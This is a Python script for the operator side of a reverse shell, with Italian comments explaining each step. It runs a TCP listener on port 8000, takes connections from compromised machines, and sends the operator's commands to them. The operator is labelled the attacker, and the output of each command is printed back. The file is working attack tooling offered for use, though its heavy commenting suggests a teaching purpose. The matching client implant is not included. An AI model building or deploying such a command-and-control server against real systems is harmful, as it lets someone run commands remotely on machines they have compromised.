#!/usr/bin/env python3
"""
Reverse Shell Server
Questo server TCP aspetta connessioni da client (reverse shell)
e permette di inviare comandi da eseguire sulla macchina remota.
"""

import socket      # Libreria per networking (socket TCP/IP)
import struct      # Serve per convertire numeri <-> byte (es. lunghezza messaggi)
import threading   # Permette di gestire più client contemporaneamente


def get_server_ip():
    """
    Chiede all'utente su quale IP il server deve mettersi in ascolto.
    """
    while True:
        ip = input("Enter server IP address (use 0.0.0.0 for all interfaces): ").strip()

        # Se input vuoto → non valido
        if not ip:
            print("You must enter a valid IP address.")
            continue

        # 0.0.0.0 = ascolta su tutte le interfacce di rete
        if ip == "0.0.0.0":
            return ip

        try:
            # Verifica che l'IP sia valido
            socket.inet_aton(ip)
            return ip
        except socket.error:
            print(f"Invalid IP address: {ip}. Try again.")


def reliable_send(sock, data):
    """
    Invia dati sul socket in modo affidabile.

    Problema: TCP è uno stream → non sai dove inizia/finisce un messaggio.
    Soluzione: inviamo prima la lunghezza (4 byte), poi i dati.
    """

    # Se è stringa → converti in bytes
    if isinstance(data, str):
        data = data.encode()

    # struct.pack('>I', len(data)):
    # >  = big-endian (byte più significativo per primo)
    # I  = intero unsigned (4 byte)
    sock.sendall(struct.pack('>I', len(data)))

    # Invio del contenuto vero
    sock.sendall(data)


def reliable_recv(sock):
    """
    Riceve dati dal socket seguendo il formato:
    [4 byte lunghezza][dati]
    """

    # Legge i primi 4 byte (lunghezza del messaggio)
    raw_len = sock.recv(4)

    # Se non riceve nulla → connessione chiusa
    if not raw_len:
        return None

    # Converte i 4 byte in intero
    data_len = struct.unpack('>I', raw_len)[0]

    # Legge esattamente data_len byte
    return sock.recv(data_len)


def handle_client(client_socket, addr):
    """
    Gestisce la comunicazione con un singolo client.
    Viene eseguita in un thread separato.
    """

    try:
        print(f"\n[+] Connection accepted from {addr[0]}:{addr[1]}")

        while True:
            # Chiede comando all'operatore (attaccante)
            command = input(f"\n{addr[0]}$ ").strip()

            # Ignora comandi vuoti
            if not command:
                continue

            # Invia comando al client
            reliable_send(client_socket, command)

            # Se comando è 'exit' → chiude sessione
            if command.lower() == 'exit':
                break

            # Riceve output dal client
            output = reliable_recv(client_socket)

            if output:
                # Decodifica bytes → stringa e stampa
                print(output.decode('utf-8', 'ignore'))

    except Exception as e:
        print(f"[!] Error: {e}")

    finally:
        # Chiude il socket quando la sessione termina
        client_socket.close()
        print(f"[!] Connection closed with {addr[0]}")


def start_server(server_ip):
    """
    Avvia il server TCP:
    - crea socket
    - fa bind su IP/porta
    - resta in ascolto
    - accetta connessioni
    """

    server_port = 8000  # Porta su cui il server ascolta

    # Creazione socket TCP IPv4
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Permette di riutilizzare la porta subito dopo riavvio
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Associa il socket a IP e porta
    server.bind((server_ip, server_port))

    # Mette il server in ascolto (max 5 connessioni in coda)
    server.listen(5)

    print(f"\n[*] Server listening on {server_ip}:{server_port}")
    print("[*] Press Ctrl+C to stop the server\n")

    try:
        while True:
            # BLOCCANTE: aspetta un client
            client_socket, addr = server.accept()

            # Crea un thread per gestire quel client
            client_thread = threading.Thread(
                target=handle_client,
                args=(client_socket, addr)
            )

            # Se il programma principale termina → chiude anche i thread
            client_thread.daemon = True

            # Avvia il thread
            client_thread.start()

    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")

    finally:
        # Chiude il socket server
        server.close()


# Punto di ingresso del programma
if __name__ == "__main__":
    print("=== Reverse Shell Server ===")

    # Chiede IP all'utente
    server_ip = get_server_ip()

    # Avvia il server
    start_server(server_ip)